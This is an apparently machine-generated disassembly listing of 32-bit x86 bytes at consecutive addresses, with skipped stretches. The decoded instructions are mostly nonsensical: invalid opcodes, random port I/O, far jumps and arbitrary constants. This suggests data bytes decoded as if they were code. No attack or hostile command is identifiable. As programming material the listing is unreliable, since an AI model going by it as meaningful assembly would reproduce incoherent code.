  41eff2:	enter  0x7620,0x70
  41eff6:	(bad)  
  41eff7:	out    0x70,eax
  41eff9:	stos   BYTE PTR es:[edi],al
  41effa:	stos   BYTE PTR es:[edi],al
  41effb:	addr16 pop edx
  41effd:	and    esi,edi
  41efff:	dec    ebx
  41f000:	cmp    BYTE PTR [ecx+ecx*1],al
  41f003:	ja     0x41f036
  41f005:	gs mov bh,0xd7
  41f008:	or     dh,BYTE PTR [esi-0x3a6cd4a5]
  41f00e:	cmp    ebp,esp
  41f010:	jl     0x41efc2
  41f012:	cmp    ebx,DWORD PTR [edx-0x7b7dc74f]
  41f018:	jmp    0x41efa3
  41f01a:	sbb    edx,DWORD PTR [eax]
  41f01c:	out    0x42,al
  41f01e:	nop
  41f01f:	fs jne 0x41eff9
  41f022:	inc    ecx
  41f023:	jne    0x41efcf
  41f025:	lock les eax,FWORD PTR [eax]
  41f028:	sub    al,0x53
  41f02a:	mov    ecx,0xe155413c
  41f02f:	cli    
  41f030:	add    eax,0xc97412c2
  41f035:	mov    eax,ds:0x53b1ed59
  41f03a:	in     eax,0x2f
  41f03c:	adc    eax,0x2c953479
  41f041:	inc    edx
  41f042:	cmp    BYTE PTR [eax+0x30],bh
  41f045:	inc    ebx
  41f046:	les    edi,FWORD PTR [edx+ebx*4]
  41f049:	sub    DWORD PTR [ecx],ebp
  41f04b:	cmp    al,0xdb
  41f04d:	arpl   WORD PTR [ecx-0x2c229b42],di
  41f053:	iret   
  41f054:	or     BYTE PTR [eax+esi*8+0x24631749],0x73
  41f05c:	inc    ecx
  41f05d:	add    eax,edi
  41f05f:	hlt    
  41f060:	out    0x34,eax
  41f062:	lahf   
  41f063:	and    ebp,DWORD PTR ds:0xa90e638
  41f069:	movd   DWORD PTR [esi-0x14],mm1
  41f06d:	hlt    
  41f06e:	adc    eax,0x3c83e032
  41f073:	push   cs
  41f074:	push   es
  41f075:	popf   
  41f076:	xor    DWORD PTR [ecx-0x3bdff9c2],edi
  41f07c:	mov    ebx,0x769c0b39
  41f081:	mov    edi,0x4728e55c
  41f086:	lds    edi,FWORD PTR [edx+0x21bc9a09]
  41f08c:	pop    es
  41f08d:	popf   
  41f08e:	pop    ebx
  41f08f:	xchg   edx,eax
  41f090:	retf   
  41f091:	mov    ch,0xa2
  41f093:	leave  
  41f094:	pop    ss
  41f095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f096:	pop    edx
  41f097:	dec    esi
  41f098:	imul   DWORD PTR [edx]
  41f09a:	inc    ebp
  41f09b:	outs   dx,DWORD PTR ds:[esi]
  41f09c:	or     ebp,edx
  41f09e:	mov    ch,0xa3
  41f0a0:	lds    esp,FWORD PTR [ebp-0x22]
  41f0a3:	aas    
  41f0a4:	cdq    
  41f0a5:	or     ecx,edx
  41f0a7:	(bad)  
  41f0a8:	mov    eax,0xeb24c8a6
  41f0ad:	add    BYTE PTR [edx+ebp*2-0x2],ch
  41f0b1:	out    dx,al
  41f0b2:	xchg   ebx,eax
  41f0b3:	dec    ebx
  41f0b4:	rol    BYTE PTR [eax],cl
	...
  41f116:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f11b:	mov    ebx,0x6df0ffdf
  41f120:	sub    dh,BYTE PTR [ecx-0x42089d7e]
  41f126:	cs dec ecx
  41f128:	add    DWORD PTR [eax],eax
  41f12a:	pop    es
  41f12b:	add    DWORD PTR [eax],eax
  41f12d:	add    BYTE PTR [esi-0x51ee66f9],al
  41f133:	es mov bh,0x10
  41f136:	aad    0x7a
  41f138:	mov    dl,BYTE PTR [esi-0x5629a400]
  41f13e:	call   0xb9125a0c
  41f143:	and    al,0x5c
  41f145:	push   ecx
  41f146:	(bad)  
  41f148:	or     eax,0xbd9a1700
  41f14d:	test   al,0xc6
  41f14f:	push   ebp
  41f150:	mov    BYTE PTR [ebp-0x50361c10],dh
  41f156:	inc    ebx
  41f157:	outs   dx,BYTE PTR ds:[esi]
  41f158:	or     eax,0x2ea74a7e
  41f15d:	inc    edx
  41f15e:	mov    cl,0xfc
  41f160:	xchg   ecx,eax
  41f161:	ficomp WORD PTR [ebp+0xba2308c]
  41f167:	lock jnp 0x41f13a
  41f16a:	imul   ecx,DWORD PTR [eax+0x225e6e68],0x7dbd9121
  41f174:	adc    DWORD PTR [ebp+0x46c4e2f],edi
  41f17a:	adc    al,0xce
  41f17c:	in     eax,0xf9
  41f17e:	mov    edi,0xace85775
  41f183:	or     eax,0xba87092d
  41f188:	mov    ah,0xeb
  41f18a:	pop    ebp
  41f18b:	test   DWORD PTR ds:0x1c6500ea,ecx
  41f191:	je     0x41f1e6
  41f193:	xor    esi,ecx
  41f195:	xchg   edx,eax
  41f196:	inc    esi
  41f197:	or     cl,bh
  41f199:	mov    bh,0xa7
  41f19b:	dec    eax
  41f19c:	(bad)  
  41f19d:	cli    
  41f19e:	je     0x41f162
  41f1a0:	test   eax,0xe96a9f2
  41f1a5:	inc    ebp
  41f1a6:	jbe    0x41f175
  41f1a8:	ficom  DWORD PTR [edi-0x3a144340]
  41f1ae:	fs mov al,0x62
  41f1b1:	sbb    ah,bh
  41f1b3:	fstp   QWORD PTR [ebx+ebx*8]
  41f1b6:	dec    DWORD PTR [esi]
  41f1b8:	mov    al,0x33
  41f1ba:	mov    dh,0xf1
  41f1bc:	add    eax,0xe180a8f8
  41f1c1:	rcr    DWORD PTR [edx+edi*1-0x77],0xfd
  41f1c6:	xchg   esi,eax
  41f1c7:	or     ah,BYTE PTR ds:[esi]
  41f1ca:	int    0xcf
  41f1cc:	stos   BYTE PTR es:[edi],al
  41f1cd:	add    BYTE PTR [ebx+0x30],cl
  41f1d0:	mov    ds:0xa080eadb,eax
  41f1d5:	push   ss
  41f1d6:	pop    ss
  41f1d7:	inc    ebp
  41f1d8:	sub    DWORD PTR [edi],ebp
  41f1da:	dec    ebp
  41f1db:	pushf  
  41f1dc:	mov    ebp,DWORD PTR [esi]
  41f1de:	inc    edi
  41f1df:	(bad)  
  41f1e0:	push   ebx
  41f1e1:	(bad)  [ebx+0x2ed73df]
  41f1e7:	sti    
  41f1e8:	out    0x5b,al
  41f1ea:	add    bh,BYTE PTR [edx-0x7027e7a1]
  41f1f0:	sbb    DWORD PTR [eax+eiz*8],edi
  41f1f3:	ficom  DWORD PTR [ebp-0x412e287f]
  41f1f9:	pusha  
  41f1fa:	xchg   edx,eax
  41f1fb:	push   ebx
  41f1fc:	pop    ebp
  41f1fd:	push   es
  41f1fe:	dec    eax
  41f1ff:	cld    
  41f200:	ins    BYTE PTR es:[edi],dx
  41f201:	jp     0x41f25b
  41f203:	addr16 jnp 0x41f1dc
  41f206:	cmp    BYTE PTR [ebx],ah
  41f208:	cli    
  41f209:	outs   dx,DWORD PTR ds:[esi]
  41f20a:	gs call 0xb5f6:0x3b39a40b
  41f212:	pop    edi
  41f213:	dec    edi
  41f214:	psubd  mm2,QWORD PTR [esp+edx*4+0x54b54d49]
  41f21c:	retf   0x72bd
  41f21f:	es loopne 0x41f1d3
  41f222:	ret    0xfbd4
  41f225:	test   BYTE PTR [eax+edi*4-0x20],bh
  41f229:	jnp    0x41f28b
  41f22b:	dec    ecx
  41f22c:	jns    0x41f2aa
  41f22e:	add    bh,dl
  41f230:	(bad)  
  41f231:	out    0x34,eax
  41f233:	jo     0x41f20d
	...
  41f295:	add    BYTE PTR [ecx+0x1b],dl
  41f298:	jmp    DWORD PTR [esi-0x1]
  41f29b:	out    0xd9,al
  41f29d:	aas    
  41f29e:	push   eax
  41f29f:	xor    DWORD PTR [edi-0x14],ebx
  41f2a2:	add    esi,esi
  41f2a4:	shr    DWORD PTR [edi+0x35],0x4a
  41f2a8:	add    DWORD PTR [eax],eax
  41f2aa:	pop    es
  41f2ab:	add    DWORD PTR [eax],eax
  41f2ad:	add    BYTE PTR [ebx],cl
  41f2af:	push   eax
  41f2b0:	sub    BYTE PTR [ecx+ecx*2],cl
  41f2b3:	jno    0x41f243
  41f2b5:	sub    DWORD PTR [edi+0x10612ad4],0x98dd260e
  41f2bf:	mov    WORD PTR [edi],?
  41f2c1:	arpl   WORD PTR [edi+0x47],bx
  41f2c4:	sub    eax,0x523034bd
  41f2c9:	shr    ebx,cl
  41f2cb:	jnp    0x41f2d7
  41f2cd:	sar    BYTE PTR [edx],1
  41f2cf:	call   0xee4:0x92e7c677
  41f2d6:	pop    ds
  41f2d7:	aaa    
  41f2d8:	adc    ch,bh
  41f2da:	xor    al,0x73
  41f2dc:	pusha  
  41f2dd:	xlat   BYTE PTR ds:[ebx]
  41f2de:	lds    edx,FWORD PTR [ebx+0x49cb6ce6]
  41f2e4:	adc    DWORD PTR [ecx-0x2d],ebp
  41f2e7:	inc    edx
  41f2e8:	cmp    esp,0x30
  41f2eb:	push   ds
  41f2ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2ed:	xchg   esi,eax
  41f2ee:	add    bh,BYTE PTR [edi+edx*4]
  41f2f1:	lahf   
  41f2f2:	jno    0x41f29f
  41f2f4:	or     DWORD PTR [ebx],0x3b
  41f2f7:	sbb    eax,0x3e2a376a
  41f2fc:	sbb    edi,0xd40a42
  41f302:	sahf   
  41f303:	iret   
  41f304:	clc    
  41f305:	mov    edx,0x29c8b1f0
  41f30a:	mov    cl,0x61
  41f30c:	or     al,0x5a
  41f30e:	fcmovb st,st(6)
  41f310:	sbb    eax,0x4a20883f
  41f315:	dec    esp
  41f316:	mov    cs,WORD PTR [edx]
  41f318:	xor    edi,ebx
  41f31a:	loope  0x41f2db
  41f31c:	push   edi
  41f31d:	les    ecx,FWORD PTR [esi-0x466e672c]
  41f323:	shl    DWORD PTR [esp+ebp*1+0x63],cl
  41f327:	repnz rol BYTE PTR [ecx+0x71aa8867],0xa2
  41f32f:	or     al,0xae
  41f331:	sub    al,0x72
  41f333:	btc    ebx,eax
  41f336:	fimul  DWORD PTR [edi]
  41f338:	and    eax,0xd09b94c9
  41f33d:	mov    cl,0xfb
  41f33f:	add    BYTE PTR [eax-0x103e1633],cl
  41f345:	fld    DWORD PTR [ebx-0x9]
  41f348:	fs pop ds
  41f34a:	sbb    eax,0xf9484d4e
  41f34f:	mov    bl,0x34
  41f351:	out    dx,al
  41f352:	mov    esp,0x566d65da
  41f357:	and    edx,esp
  41f359:	add    dl,bl
  41f35b:	idiv   DWORD PTR ds:0x264b506
  41f361:	test   al,0xbe
  41f363:	in     eax,dx
  41f364:	loop   0x41f3de
  41f366:	clc    
  41f367:	in     eax,dx
  41f368:	in     eax,dx
  41f369:	stc    
  41f36a:	ret    
  41f36b:	mov    dh,0x91
  41f36d:	push   esi
  41f36e:	cmp    bh,BYTE PTR [ebp+0x4b0ab09d]
  41f374:	das    
  41f375:	ins    DWORD PTR es:[edi],dx
  41f376:	(bad)  
  41f377:	pop    ss
  41f378:	or     DWORD PTR [esi+edi*1+0x431bc641],ebx
  41f37f:	push   edx
  41f380:	sub    esp,ebp
  41f382:	jle    0x41f3fb
  41f384:	das    
  41f385:	(bad)
  41f388:	cmp    eax,0x59d26522
  41f38d:	mov    edi,0x86dea807
  41f392:	inc    ebx
  41f393:	or     ah,BYTE PTR [ecx-0x16]
  41f396:	xor    DWORD PTR [ebx+edx*8+0x41a562a],ecx
  41f39d:	or     edx,DWORD PTR ds:0x35d891fc
  41f3a3:	cmp    ecx,DWORD PTR [edx+0x2df7072]
  41f3a9:	sub    esi,DWORD PTR [ebp-0x4cba6859]
  41f3af:	jmp    0xec3cd70
  41f3b4:	push   edi
	...
  41f415:	add    BYTE PTR [edi+eiz*8],bh
  41f418:	imul   ebp,edi,0xfffffffb
  41f41b:	out    dx,eax
  41f41c:	mov    esp,0xc961c5f7
  41f421:	xchg   edx,eax
  41f422:	adc    bl,BYTE PTR [ebx+0x4b3c0929]
  41f428:	add    DWORD PTR [eax],eax
  41f42a:	pop    es
  41f42b:	add    DWORD PTR [eax],eax
  41f42d:	add    BYTE PTR [esp+ebx*2-0x336678da],bl
  41f434:	sbb    DWORD PTR [esi-0x6bf65573],ebx
  41f43a:	pushf  
  41f43b:	in     al,0xbe
  41f43d:	loope  0x41f400
  41f43f:	into   
  41f440:	or     eax,0xddc7033b
  41f445:	into   
  41f446:	(bad)  
  41f447:	ror    ebp,1
  41f449:	loope  0x41f487
  41f44b:	sahf   
  41f44c:	jae    0x41f432
  41f44e:	enter  0x7deb,0x7b
  41f452:	sub    al,0xda
  41f454:	sti    
  41f455:	in     al,dx
  41f456:	push   es
  41f457:	dec    esp
  41f458:	xchg   edi,eax
  41f459:	inc    eax
  41f45a:	and    eax,0xc774635b
  41f45f:	or     BYTE PTR [edi-0x1c7ef374],0x85
  41f466:	neg    BYTE PTR [ebx+0x230ab80f]
  41f46c:	mov    ebx,0xa48b44f7
  41f471:	int    0xb1
  41f473:	dec    esp
  41f474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f475:	push   edi
  41f476:	ret    0xf540
  41f479:	xchg   ecx,eax
  41f47a:	mov    DWORD PTR [eax+0x6433a702],eax
  41f480:	pop    esp
  41f481:	mov    cl,0xb7
  41f483:	rcr    DWORD PTR [ecx],1
  41f485:	add    eax,0x93270d70
  41f48a:	out    0xab,eax
  41f48c:	push   eax
  41f48d:	mov    dh,0xa2
  41f48f:	xlat   BYTE PTR ds:[ebx]
  41f490:	cmp    DWORD PTR [edx+0x28],eax
  41f493:	xor    BYTE PTR [eax-0x59490917],cl
  41f499:	cmp    edi,DWORD PTR [esi+eax*4]
  41f49c:	lea    edx,[ecx-0x62488e5c]
  41f4a2:	stos   BYTE PTR es:[edi],al
  41f4a3:	out    0xaf,al
  41f4a5:	loop   0x41f500
  41f4a7:	out    0x65,al
  41f4a9:	movups xmm4,XMMWORD PTR [eax+esi*4+0x1c622874]
  41f4b1:	jp     0x41f473
  41f4b3:	mov    al,ds:0x2c7e07f2
  41f4b8:	sbb    ch,BYTE PTR [ecx]
  41f4ba:	daa    
  41f4bb:	pusha  
  41f4bc:	jns    0x41f4ad
  41f4be:	scas   al,BYTE PTR es:[edi]
  41f4bf:	xchg   ebp,eax
  41f4c0:	push   cs
  41f4c1:	xchg   dh,dh
  41f4c3:	and    al,0xc6
  41f4c5:	push   0x18f7fcbb
  41f4ca:	lods   al,BYTE PTR ds:[esi]
  41f4cb:	jge    0x41f4b2
  41f4cd:	or     DWORD PTR [edx-0x6909fe9d],esp
  41f4d3:	aaa    
  41f4d4:	dec    ebp
  41f4d5:	retf   
  41f4d6:	jl     0x41f534
  41f4d8:	lds    esi,FWORD PTR [ebx+0x5f]
  41f4db:	mov    ebp,0x3358ea72
  41f4e0:	adc    DWORD PTR [esp+ecx*8+0x7703fcd9],ebx
  41f4e7:	les    eax,FWORD PTR [ecx-0x4d]
  41f4ea:	inc    ecx
  41f4eb:	ret    
  41f4ec:	inc    eax
  41f4ed:	lock stc 
  41f4ef:	and    BYTE PTR [eax],al
  41f4f1:	hlt    
  41f4f2:	sti    
  41f4f3:	sbb    eax,0x5e051177
  41f4f8:	arpl   WORD PTR [edx-0x55],di
  41f4fb:	cmp    al,0x9a
  41f4fd:	adc    bl,BYTE PTR [ecx-0x19174579]
  41f503:	out    dx,eax
  41f504:	sbb    BYTE PTR [eax-0x7ffd69d4],bl
  41f50a:	mov    edx,0x5b4a9ab1
  41f50f:	scas   al,BYTE PTR es:[edi]
  41f510:	ins    DWORD PTR es:[edi],dx
  41f511:	cmp    eax,ecx
  41f513:	lds    edi,FWORD PTR es:[ebx-0x2f]
  41f517:	xchg   ebx,eax
  41f518:	xchg   edx,eax
  41f519:	push   edi
  41f51a:	out    dx,al
  41f51b:	retf   0xb16
  41f51e:	call   0xf100:0x2e82584a
  41f525:	aas    
  41f526:	pop    ebp
  41f527:	out    dx,al
  41f528:	mov    ?,WORD PTR [edx-0x1d35c78b]
  41f52e:	pmaxub mm0,QWORD PTR [edx+0x3e]
  41f532:	add    eax,0x8977
	...
  41f593:	add    BYTE PTR [eax],al
  41f595:	add    BYTE PTR [eax+0x34],bh
  41f598:	add    bh,bl
  41f59a:	dec    esi
  41f59b:	(bad)  
  41f59c:	stc    
  41f59d:	mov    bh,0x14
  41f59f:	pop    ebp
  41f5a0:	sub    cl,ah
  41f5a2:	cmp    al,ah
  41f5a4:	dec    ebp
  41f5a5:	pop    ds
  41f5a6:	inc    ebx
  41f5a7:	dec    esp
  41f5a8:	add    DWORD PTR [eax],eax
  41f5aa:	pop    es
  41f5ab:	add    DWORD PTR [eax],eax
  41f5ad:	add    cl,al
  41f5af:	pop    esp
  41f5b0:	adc    esi,eax
  41f5b2:	inc    esp
  41f5b3:	adc    al,0x74
  41f5b5:	jb     0x41f5f3
  41f5b7:	shl    ch,0x50
  41f5ba:	jns    0x41f595
  41f5bc:	cld    
  41f5bd:	pop    ds
  41f5be:	add    ch,al
  41f5c0:	pusha  
  41f5c1:	mov    ah,0x11
  41f5c3:	xchg   ebx,eax
  41f5c4:	ins    BYTE PTR es:[edi],dx
  41f5c5:	test   DWORD PTR [esi+0x73bb2efa],edi
  41f5cb:	out    0x7e,eax
  41f5cd:	imul   ecx,DWORD PTR [eax],0x4f
  41f5d0:	test   eax,0x56f13a90
  41f5d5:	idiv   DWORD PTR [edi]
  41f5d7:	jns    0x41f632
  41f5d9:	cmp    edx,DWORD PTR [edx]
  41f5db:	adc    esi,DWORD PTR [edx+eiz*4+0x692c9808]
  41f5e2:	adc    al,0x67
  41f5e4:	pop    esp
  41f5e5:	fnstsw ax
  41f5e7:	sbb    DWORD PTR [edx],esi
  41f5e9:	addr16 mov dh,0xa7
  41f5ec:	push   0xffffff89
  41f5ee:	(bad)  
  41f5ef:	in     al,dx
  41f5f0:	dec    edx
  41f5f1:	int3   
  41f5f2:	loop   0x41f60d
  41f5f4:	enter  0x118e,0xc7
  41f5f8:	(bad)  
  41f5f9:	cld    
  41f5fa:	hlt    
  41f5fb:	jno    0x41f62a
  41f5fd:	xchg   ebp,ecx
  41f5ff:	into   
  41f600:	retf   0xf49e
  41f603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f604:	das    
  41f605:	ficomp WORD PTR [eax-0x57]
  41f608:	iret   
  41f609:	dec    edx
  41f60a:	in     al,dx
  41f60b:	mov    ebp,0xd306b560
  41f610:	daa    
  41f611:	jne    0x41f636
  41f613:	cs mov ecx,0x3975f751
  41f619:	or     eax,edx
  41f61b:	jno    0x41f643
  41f61d:	or     BYTE PTR [esi+ebx*4+0x19f523a2],ah
  41f624:	add    dh,BYTE PTR cs:[ebx+0x7c]
  41f628:	mov    esp,0x4c1e066e
  41f62d:	dec    esp
  41f62e:	mov    ss,WORD PTR [edi+esi*8-0x17]
  41f632:	sbb    eax,0xaae2d4b0
  41f637:	cs daa 
  41f639:	lea    eax,[edi+ebp*4+0x45]
  41f63d:	inc    ebp
  41f63e:	adc    BYTE PTR [ebx-0x3d2e211d],0x59
  41f645:	mov    bl,0x40
  41f647:	xor    eax,0xd8a61c78
  41f64c:	lahf   
  41f64d:	or     DWORD PTR [edx],edx
  41f64f:	inc    edi
  41f650:	pop    ds
  41f651:	push   0xe20116bb
  41f656:	gs add eax,0x9b30cbd9
  41f65c:	cmp    DWORD PTR [esi+0x22],ecx
  41f65f:	fs aad 0x6d
  41f662:	xchg   ebx,eax
  41f663:	cli    
  41f664:	arpl   WORD PTR [edi-0x1d],sp
  41f667:	push   esp
  41f668:	xor    edx,ebp
  41f66a:	dec    DWORD PTR [esi+0x2d7f17f5]
  41f670:	call   0x5d25b5b
  41f675:	push   ds
  41f676:	add    BYTE PTR [edi-0x55bae8],ah
  41f67c:	cmp    eax,0x6d5e0e11
  41f681:	xor    BYTE PTR [esi+ebp*8],bl
  41f684:	hlt    
  41f685:	jmp    0x41f662
  41f687:	cdq    
  41f688:	mov    ebx,0x3370b520
  41f68d:	inc    esp
  41f68e:	add    eax,0x2602fe80
  41f693:	sbb    BYTE PTR [ebx+0x10],al
  41f696:	int    0x8a
  41f698:	ret    
  41f699:	inc    ebp
  41f69a:	aad    0xf0
  41f69c:	mov    WORD PTR [edx],es
  41f69e:	outs   dx,BYTE PTR ds:[esi]
  41f69f:	xchg   ecx,eax
  41f6a0:	pushf  
  41f6a1:	sub    bl,BYTE PTR ds:0x1b68f4d8
  41f6a7:	arpl   WORD PTR [esi+0xbe559d4],ax
  41f6ad:	adc    esp,DWORD PTR [eax-0x7f]
  41f6b0:	or     cl,bl
  41f6b2:	push   ss
  41f6b3:	mov    WORD PTR [esi],cs
	...
  41f715:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f71b:	jg     0x41f6fc
  41f71d:	cld    
  41f71e:	dec    ecx
  41f71f:	loope  0x41f6f2
  41f721:	sbb    DWORD PTR [ecx+0x4a4fb5a3],edx
  41f727:	dec    ebp
  41f728:	add    DWORD PTR [eax],eax
  41f72a:	pop    es
  41f72b:	add    DWORD PTR [eax],eax
  41f72d:	add    BYTE PTR [edx+0x79],bh
  41f730:	push   ds
  41f731:	sar    DWORD PTR [edx],cl
  41f733:	xchg   esi,eax
  41f734:	mov    bh,0x7e
  41f736:	push   0xf8e6ffcf
  41f73b:	sbb    DWORD PTR [edi],0xffffff85
  41f73e:	push   ebp
  41f73f:	mov    DWORD PTR cs:[ebp+edx*1+0x13e9dfd6],edx
  41f747:	inc    edi
  41f748:	inc    esp
  41f749:	cld    
  41f74a:	test   DWORD PTR [ebx-0x3d2562ec],ebp
  41f750:	(bad)  
  41f751:	leave  
  41f752:	mov    ecx,0x3b69c7e2
  41f757:	cwde   
  41f758:	pushf  
  41f759:	cwde   
  41f75a:	sub    bh,BYTE PTR [ecx]
  41f75c:	les    edi,FWORD PTR [eax-0x50]
  41f75f:	mov    BYTE PTR [esp+eax*1-0x59c45684],dl
  41f766:	fild   QWORD PTR [ebp+ebx*4+0x6e]
  41f76a:	pop    ebp
  41f76b:	fsubr  DWORD PTR [eax]
  41f76d:	stc    
  41f76e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f76f:	shr    DWORD PTR [eax-0x70],cl
  41f772:	mov    cs,WORD PTR [edi-0x2b]
  41f775:	ror    ah,0xc7
  41f778:	div    DWORD PTR [ebx+0x7f]
  41f77b:	cld    
  41f77c:	add    dh,BYTE PTR [edi+ecx*1]
  41f77f:	mov    al,ds:0x295887c7
  41f784:	jb     0x41f723
  41f786:	pop    esp
  41f787:	mov    fs,WORD PTR [eax-0x526f36d]
  41f78d:	out    dx,eax
  41f78e:	dec    edx
  41f78f:	jns    0x41f72e
  41f791:	lahf   
  41f792:	xchg   DWORD PTR [ebx],esp
  41f794:	pop    esp
  41f795:	sbb    edx,DWORD PTR [ecx+ebx*4+0x9]
  41f799:	hlt    
  41f79a:	or     al,0xe7
  41f79c:	loopne 0x41f7e3
  41f79e:	cmp    al,0xb0
  41f7a0:	fiadd  DWORD PTR [esi]
  41f7a2:	add    eax,0x8376492d
  41f7a7:	cmp    dl,cl
  41f7a9:	gs xor eax,0xedf5300f
  41f7af:	xor    al,0xab
  41f7b1:	xchg   ebx,eax
  41f7b2:	xchg   esp,eax
  41f7b3:	lea    ecx,[edx]
  41f7b5:	push   cs
  41f7b6:	inc    edx
  41f7b7:	lahf   
  41f7b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7b9:	inc    ebx
  41f7ba:	mov    bl,0xaa
  41f7bc:	push   eax
  41f7bd:	dec    esp
  41f7be:	sbb    eax,0x57ec8148
  41f7c3:	popa   
  41f7c4:	or     ebp,ecx
  41f7c6:	cmp    edi,eax
  41f7c8:	sbb    eax,0xa7c6eded
  41f7cd:	dec    esi
  41f7ce:	mov    eax,ds:0x50197e45
  41f7d3:	fucomip st,st(1)
  41f7d5:	test   dh,dl
  41f7d7:	addr16 shl eax,1
  41f7da:	sbb    eax,0xc047735d
  41f7df:	(bad)  
  41f7e1:	ins    DWORD PTR es:[edi],dx
  41f7e2:	push   edx
  41f7e3:	lock mov dl,bh
  41f7e6:	and    al,0x15
  41f7e8:	je     0x41f7fa
  41f7ea:	aaa    
  41f7eb:	cdq    
  41f7ec:	xor    eax,0x6767cd7
  41f7f1:	(bad)  
  41f7f2:	call   0xe6ed882b
  41f7f7:	adc    DWORD PTR [ecx],edi
  41f7f9:	stos   BYTE PTR es:[edi],al
  41f7fa:	pop    ds
  41f7fb:	retf   0xd0f7
  41f7fe:	xchg   ah,bh
  41f800:	or     ebx,DWORD PTR [eax+edi*1-0x63]
  41f804:	cmp    al,0x3a
  41f806:	mov    eax,ss
  41f808:	test   BYTE PTR [ebx-0x55],al
  41f80b:	ror    DWORD PTR [esi+0x76],0x16
  41f80f:	mov    esi,0xf016deb3
  41f814:	in     al,0x91
  41f816:	ins    BYTE PTR es:[edi],dx
  41f817:	cdq    
  41f818:	ins    DWORD PTR es:[edi],dx
  41f819:	dec    esp
  41f81a:	push   0x555e82d2
  41f81f:	repnz fucomi st,st(1)
  41f822:	adc    BYTE PTR [eax],ch
  41f824:	rcl    BYTE PTR [ebx],1
  41f826:	mov    ebp,0x90792c
  41f82b:	das    
  41f82c:	in     al,dx
  41f82d:	retf   0xce01
  41f830:	jb     0x41f8ae
  41f832:	xor    al,0x8c
  41f834:	int    0x0
	...
  41f896:	mov    eax,ds:0x3b920b9a
  41f89b:	xchg   ebx,eax
  41f89c:	mov    ecx,0x25be46bb
  41f8a1:	mov    esp,eax
  41f8a3:	mov    bh,0xc3
  41f8a5:	loopne 0x41f8f8
  41f8a7:	dec    esi
  41f8a8:	add    DWORD PTR [eax],eax
  41f8aa:	pop    es
  41f8ab:	add    DWORD PTR [eax],eax
  41f8ad:	add    BYTE PTR [ecx],cl
  41f8af:	sub    ah,BYTE PTR [ebx+0x56c54c65]
  41f8b5:	push   ecx
  41f8b6:	imul   ebx,DWORD PTR [esi],0x20
  41f8b9:	push   esp
  41f8ba:	jmp    0xef9e:0x1096d3f8
  41f8c1:	xchg   esi,eax
  41f8c2:	aaa    
  41f8c3:	xchg   DWORD PTR [ebx+0x34e2d154],esp
  41f8c9:	xchg   edx,eax
  41f8ca:	sub    bl,ah
  41f8cc:	jge    0x41f91e
  41f8ce:	popf   
  41f8cf:	aad    0xf
  41f8d1:	pop    ebx
  41f8d2:	leave  
  41f8d3:	sbb    BYTE PTR [eax],ah
  41f8d5:	enter  0x6f50,0x6d
  41f8d9:	outs   dx,DWORD PTR ds:[esi]
  41f8da:	add    cl,BYTE PTR [ecx-0x33ba4e5]
  41f8e0:	out    0xaa,al
  41f8e2:	les    esi,FWORD PTR [ebx+ebx*4-0x7]
  41f8e6:	retf   0x8eac
  41f8e9:	(bad)  
  41f8ea:	hlt    
  41f8eb:	add    esi,DWORD PTR [edi+edi*8+0x3f88ab67]
  41f8f2:	mov    ecx,DWORD PTR [edx-0x35]
  41f8f5:	(bad)  
  41f8f6:	adc    eax,0x799f0d1b
  41f8fb:	loopne 0x41f8a5
  41f8fd:	xlat   BYTE PTR ds:[ebx]
  41f8fe:	sub    cl,cl
  41f900:	jnp    0x41f88d
  41f902:	mov    cl,0x48
  41f904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f905:	xchg   esi,eax
  41f906:	or     edi,DWORD PTR [esi+ecx*2-0x5330ca91]
  41f90d:	jbe    0x41f8c8
  41f90f:	sbb    BYTE PTR [edx],bl
  41f911:	add    bh,cl
  41f913:	xchg   edx,eax
  41f914:	imul   edi,DWORD PTR [edi+edi*2],0x37c36c9f
  41f91b:	loopne 0x41f953
  41f91d:	aad    0x98
  41f91f:	cmp    BYTE PTR ds:0x147785f0,al
  41f925:	pop    esi
  41f926:	pushf  
  41f927:	pop    ds
  41f928:	pop    esi
  41f929:	add    edi,esp
  41f92b:	pop    ebx
  41f92c:	cmp    ecx,DWORD PTR [ecx+eiz*4+0x5222faa7]
  41f933:	and    al,0x99
  41f935:	mov    ah,0x75
  41f937:	and    esp,DWORD PTR ds:0x104a4f18
  41f93d:	fcmovne st,st(5)
  41f93f:	push   esp
  41f940:	and    BYTE PTR [eax],cl
  41f942:	mov    ds:0xe082e26b,eax
  41f947:	jp     0x41f99a
  41f949:	xor    al,0xa2
  41f94b:	xchg   esi,eax
  41f94c:	int    0x5f
  41f94e:	push   eax
  41f94f:	and    bl,cl
  41f951:	aad    0x98
  41f953:	xchg   edx,eax
  41f954:	into   
  41f955:	xor    DWORD PTR [edx+0x22f6d576],ebx
  41f95b:	popa   
  41f95c:	std    
  41f95d:	outs   dx,BYTE PTR ds:[esi]
  41f95e:	push   edi
  41f95f:	pop    edx
  41f960:	adc    ah,ch
  41f962:	imul   ebx,DWORD PTR [edi],0xfffffffb
  41f965:	dec    esp
  41f966:	(bad)  
  41f967:	out    dx,al
  41f968:	add    bl,BYTE PTR [ebx+0x5b]
  41f96b:	jae    0x41f985
  41f96d:	sbb    al,0x46
  41f96f:	int3   
  41f970:	push   esi
  41f971:	cmp    dh,BYTE PTR [ecx]
  41f973:	xor    ch,BYTE PTR [esi-0x3]
  41f976:	cdq    
  41f977:	(bad)  
  41f978:	adc    edx,ebp
  41f97a:	xchg   edx,eax
  41f97b:	pop    ds
  41f97c:	mov    ebp,0x5c6332fb
  41f981:	nop
  41f982:	in     eax,dx
  41f983:	scas   eax,DWORD PTR es:[edi]
  41f984:	test   eax,0x149e71b3
  41f989:	loopne 0x41f94a
  41f98b:	mov    bl,0xd2
  41f98d:	gs iret 
  41f98f:	pslld  mm0,QWORD PTR [ecx]
  41f992:	cmp    bl,BYTE PTR [ebx]
  41f994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f995:	mov    ds:0x97c3e4c7,al
  41f99a:	aas    
  41f99b:	cdq    
  41f99c:	(bad)  
  41f99e:	cmp    BYTE PTR [edi+0x1c],0x18
